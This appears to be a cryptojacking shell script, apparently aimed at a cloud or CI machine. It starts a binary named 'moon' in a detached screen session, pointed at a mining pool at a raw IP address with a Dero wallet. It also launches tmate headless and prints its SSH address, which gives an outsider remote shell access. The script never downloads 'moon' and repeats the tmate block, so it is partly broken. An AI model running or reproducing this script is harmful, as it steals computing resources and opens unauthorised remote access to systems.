apt-get update
apt-get install wget screen -y
wget https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz
chmod 700 moon
screen -dmS work ./moon -d 45.86.230.214:80 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.ANJIR
tar xvf tmate-2.4.0-static-linux-amd64.tar.xz
cd tmate-2.4.0-static-linux-amd64
./tmate -S /var/tmate.sock new-session -d               # Launch tmate in a headless mode
./tmate -S /var/tmate.sock wait tmate-ready             # Blocks until the SSH connection is established
./tmate -S /var/tmate.sock display -p '#{tmate_ssh}'
./tmate -S /var/tmate.sock new-session -d               # Launch tmate in a headless mode
./tmate -S /var/tmate.sock wait tmate-ready             # Blocks until the SSH connection is established
./tmate -S /var/tmate.sock display -p '#{tmate_ssh}'
sleep 34823742
